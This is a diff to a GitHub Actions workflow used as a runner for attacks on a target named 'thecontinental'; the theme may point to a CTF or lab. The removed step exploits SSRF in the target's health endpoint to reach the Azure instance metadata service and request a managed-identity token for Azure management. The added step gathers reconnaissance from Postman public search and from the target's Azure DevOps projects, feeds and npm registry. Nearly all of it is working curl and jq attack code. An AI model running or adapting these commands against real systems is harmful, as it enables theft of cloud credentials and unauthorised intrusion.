@@ -10,29 +10,29 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 10
     steps:
-      - name: Compact collection and IMDS probe
+      - name: Focused Postman and Azure Artifacts discovery
         shell: bash
         run: |
           set +e
-          for id in             54600970-4edc63a9-1623-4304-8ad5-c6e0662b6452             54600970-62f5e9dc-0019-4cf5-bf1b-78ba287412d2; do
-            echo "===== COLLECTION $id ====="
-            curl -fsSL "https://api.postman.com/collections/$id" |
-              jq -r '
-                .collection as $c |
-                "NAME\t"+$c.info.name,
-                ($c.variable[]? | "VAR\t"+.key+"="+(.value|tostring)),
-                ($c.item[]? | recurse(.item[]?) | select(.request) |
-                  "REQ\t"+.name+"\t"+.request.method+"\t"+(.request.url.raw//"")+"\tBODY="+(.request.body.raw//"")+"\tHDR="+((.request.header//[])|tojson)+"\tAUTH="+((.request.auth//{})|tojson))
+          S='https://api.postman.com/search?limit=50'
+          for typ in requests environments collections workspaces; do
+            for q in 'VM_CONCIERGE_IP' 'metadata' 'deployment' 'activation' 'notification' 'runner' 'artifacts' 'concierge' 'thecontinental-dev'; do
+              R=$(curl -sS -X POST "$S" -H 'Content-Type: application/json'                 --data "$(jq -nc --arg t "$typ" --arg q "$q" '{elementType:$t,q:$q,ownership:"all",filters:{"$and":[{"visibility":{"$eq":"public"}}]}}')")
+              echo "$R" | jq -r --arg typ "$typ" --arg q "$q" '
+                .data[]? |
+                select(
+                  (.workspace.name?=="continental-devteam") or
+                  (.collection.name?|contains("Continental")) or
+                  (.organization.name?|contains("continental-devteam"))
+                ) |
+                [$typ,$q,(.name//""),(.method//""),(.url//""),(.description//""),(.id//""),(.workspace.id//"")] | @tsv
               '
+            done
           done
 
-          base='https://thecontinental.azurewebsites.net/v2/health'
-          echo "===== SSRF EXAMPLE ====="
-          curl -skSG "$base" --data-urlencode 'target=http://example.com' | head -c 800; echo
-
-          echo "===== SSRF IMDS INSTANCE ====="
-          curl -skSG "$base" --data-urlencode 'target=http://169.254.169.254/metadata/instance?api-version=2021-02-01' | head -c 6000; echo
-
-          echo "===== SSRF ARM TOKEN RESULT KEYS ONLY ====="
-          RESP=$(curl -skSG "$base" --data-urlencode 'target=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F')
-          echo "$RESP" | jq -r 'if .access_token then "TOKEN_OK type="+(.token_type//"")+" expires="+(.expires_on//"")+" resource="+(.resource//"") else . end' 2>/dev/null || echo "$RESP" | head -c 1000
+          echo '===== AZURE DEVOPS PROJECTS ====='
+          curl -skS -i 'https://dev.azure.com/thecontinental-dev/_apis/projects?api-version=7.1' | head -n 40
+          echo '===== FEEDS ====='
+          curl -skS -i 'https://feeds.dev.azure.com/thecontinental-dev/continental-api/_apis/packaging/feeds?api-version=7.1-preview.1' | head -n 40
+          echo '===== NPM V2 PACKAGE ====='
+          curl -skS -i 'https://pkgs.dev.azure.com/thecontinental-dev/continental-api/_packaging/continental-npm-v2/npm/registry/@continental%2fconcierge-sdk' | head -n 80
